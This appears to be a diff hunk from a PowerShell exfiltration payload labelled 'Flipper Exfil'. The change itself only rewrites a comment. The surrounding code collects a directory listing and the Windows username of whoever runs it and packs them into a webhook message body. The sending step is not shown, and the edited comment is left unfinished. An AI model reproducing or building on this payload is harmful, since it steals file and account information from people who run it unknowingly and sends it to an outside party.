@@ -13,7 +13,7 @@ $r = Get-ChildItem | ForEach-Object {
   }
 }
 
-# Format the custom object as a table in a Markdown code block; overwrites the name of the webhook app with the username of the Windows account you are logged into string "on Flipper Exfil"
+# Format the output as a table in a Markdown code block that overwrites the name of the webhook app with the username of the Windows account you are logged into with string 
 $body = @{'username' = $env:username + " on Flipper Exfil"
 content = "``````"+($r | Format-Table | Out-String)+"``````"}
 
